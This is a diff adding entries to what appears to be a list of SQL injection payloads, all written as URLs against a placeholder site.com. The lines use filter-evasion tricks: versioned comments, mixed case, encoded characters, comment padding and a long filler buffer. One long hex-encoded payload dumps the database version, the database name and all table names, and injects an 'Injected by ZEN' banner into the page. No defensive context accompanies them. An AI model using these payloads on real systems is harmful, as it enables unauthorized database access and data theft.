@@ -49,3 +49,6 @@ www.site.com/home.php?id=2'UnION distinctrow Select unhex(0x32653331323932393535
 www.site.com/home.php?id=2/union.*select/1,2,3--
 www.site.com/home.php?id=2/union.*select/i 1,2,3--
 www.site.com/home.php?id=2' and false /*!50000UNION*/ALL+SELECT*from(select /*!50000GrOup_CoNcat(merda SEPARATOR '')*/from(select 0x223e3c2f613e3c2f6469763e3c2f6469763e3c2f74683e3c2f74723e3c2f7461626c653e3c666f6e7420636f6c6f723d22726564223e3c62723e3c623e496e6a6563746564206279205a454e3c2f623e3c62723e56657273696f6e203a3a20 merda /*!50000union*/select version()/*!50000union*/select 0x3c62723e4461746162617365203a3a20/*!50000union*/select database()/*!50000union*/select 0x3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d22677265656e223e3c753e3a3a205461626c657320466f756e64203a3a203c2f753e3c6c693e/*!50000union*/select/*!50000group_coNcAt(table_name SEPARATOR 0x3c6c693e)*/from/*!50000InFormation_schema.tables*//*!50000where+*/table_schema=/*!50000database()*/)lol)a1 join(select(0x3133333732))a2 join(select(0x3133333733))a3 join(select(0x3133333734))a4 join(select(0x3133333735))a5 join(select(0x3133333736))a6--+
+www.site.com/home.php?id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3
+www.site.com/home.php?id=2+and+(select 1)=(Select 0xAA[..(add about 1000 “A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4
+www.site.com/home.php?id=2+uni*on+sel*ect+1,2,3,4&#8230;
